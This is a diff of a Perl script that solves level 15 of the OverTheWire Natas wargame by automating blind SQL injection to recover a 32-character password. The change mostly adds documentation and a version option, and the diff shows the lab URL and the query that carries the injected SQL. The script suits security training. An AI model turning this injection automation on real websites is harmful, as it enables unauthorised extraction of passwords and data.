@@ -1,15 +1,58 @@
-#!/usr/bin/perl
+#!/usr/bin/env perl
 use strict;
 use warnings;
 use v5.16.3;
+package
+    natas15;
+# VERSION
+# ABSTRACT: solve level 15 of overthewire.org's Natas server-side security war games
 
 use Carp qw/ confess /;
 use URI;
 use HTTP::Tiny 0.034;
-use Getopt::Long;
 
-my $opts = { wrong => 0 };
-GetOptions( $opts, 'wrong!' );
+=head1 NAME
+
+natas15 - solve level 15 of overthewire.org's Natas war games
+
+=head1 SYNOPSIS
+
+    natas15 [ --wrong ] password
+
+=head1 OPTIONS
+
+=over 4
+
+=item * C<--wrong>, --no-wrong
+
+Use the wrong SQL to find the incorrect password.
+
+This is useful as a teaching tool, to illustrate the effect of
+neglecting case-sensitivity in your injected SQL.
+
+=back
+
+=cut
+
+use Getopt::Long;
+my $opts = { wrong => 0, version => 0 };
+GetOptions( $opts, 'wrong!', 'version' );
+if ($opts->{version}) {
+    say __PACKAGE__ . ' version ' . (__PACKAGE__->VERSION // 'dev');
+    exit;
+}
+
+=head1 DESCRIPTION
+
+L<overthewire.org|http://www.overthewire.org/wargames/> has a series of war games.
+Natas is the server-side security challenge.
+
+Level 15 requires you to do blind SQL injection. Guessing each one-character
+slice of a 32-character password is tedious and prone to errors if done manually,
+so this script automates the process. Simply provide the password for level 15
+as the first argument on the command line
+
+=cut
 
 my $host = 'natas15.natas.labs.overthewire.org';
 my $uri  = URI->new(sprintf q{http://%s:%s@%s/index.php}, 'natas15', $ARGV[0], $host);
@@ -115,3 +158,13 @@ $uri->query_form({ debug => 1, username => sprintf($sql_fragment, $password_so_f
 say response_to_boolean( $u->get($uri) )
     ? "Looks correct"
     : "Looks incorrect, actually";
+
+=head1 SEE ALSO
+
+=over 4
+
+=item * L<natas16>
+
+=item * L<App::Natas>
+
+=back
